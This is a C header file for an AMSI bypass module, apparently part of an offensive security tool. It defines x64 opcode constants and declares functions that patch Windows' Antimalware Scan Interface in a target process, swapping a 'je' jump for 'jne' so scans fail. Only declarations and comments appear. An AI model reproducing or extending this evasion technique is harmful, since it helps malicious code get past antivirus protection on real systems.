#ifndef AMSI_BYPASS_H
#define AMSI_BYPASS_H

#include "../../common.h"

#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'				- instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE			0xCC		// 'int3'				- instruction opcode
#define x64_JE_INSTRUCTION_OPCODE			0x74		// 'jump if equal'		- instruction opcode
#define x64_JNE_INSTRUCTION_OPCODE			0x75		// 'jump if not equal'	- instruction opcode
#define x64_MOV_INSTRUCTION_OPCODE			0xB8		// 'move'				- instruction opcode

#define	AMSI_SIGNATURE						0x49534D41	// "ISMA" string ("AMSI" in reverse)

BOOL applyAmsiBypass(HANDLE hProcess);

/**
 *  @brief Perform a patch on the AMSI function to replace the "je" instruction with "jne" to force an error.
 * 
 *  This function modifies the AMSI function to replace the "je" instruction that jumps to "mov eax, 80070057" with a "jne" instruction.
 *  This effectively bypasses the AMSI check by preventing the function from returning a success code.
 * 
 *  @param pAmsiFunctionAddress Pointer to the address of the AMSI function to patch.
 *  @return TRUE if the patch was successful, FALSE otherwise.
 * 
 *  @name JNE Based AMSI Patch
 *  @section amsi_bypass
 *  @flags JNE_BASED_AMSI_PATCH
*/
BOOL JnePatchAmsiFunction(IN PBYTE pAmsiFunctionAddress);

#endif // AMSI_BYPASS_H